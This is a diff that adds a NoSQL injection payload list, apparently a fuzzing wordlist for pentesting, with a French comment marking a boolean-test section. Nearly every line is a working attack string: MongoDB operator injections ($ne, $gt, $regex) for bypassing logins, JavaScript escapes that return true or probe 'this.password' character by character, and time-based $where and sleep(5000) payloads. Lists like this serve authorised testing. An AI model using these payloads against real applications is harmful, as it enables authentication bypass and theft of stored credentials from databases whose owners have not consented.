@@ -1,0 +1,37 @@
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$gte": ""}
+{"$ne": 1}
+{"$in": ["admin", "user", "guest"]}
+{"$exists": true}
+{"$nin": []}
+{"user": "admin", "password": {"$ne": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+' || '1'=='1
+" || "1"=="1
+'; return true; var s='
+'; return true || '
+' || true || '
+' || 1==1 || '
+" || 1==1 || "
+admin' || '1'=='1
+admin" || "1"=="1
+'; return '' == '
+"; return "" == "
+0; return true
+{"$regex": "^a"}
+{"$regex": "^admin"}
+{"$regex": "^.{0,5}$"}
+# Test Booléen (Vrai/Faux)
+' && this.password.length > 5 || '
+' && this.password.match(/^a.*$/) || '
+" && this.password.match(/^a.*$/) || "
+'; sleep(5000); var s='
+"; sleep(5000); var s="
+' || sleep(5000) || '
+" || sleep(5000) || "
+{"$where": "sleep(5000)"}
+{"$where": "function(){sleep(5000); return true;}"}
+'; var date=new Date(); do{curDate = new Date();}while(curDate-date<5000); var s='
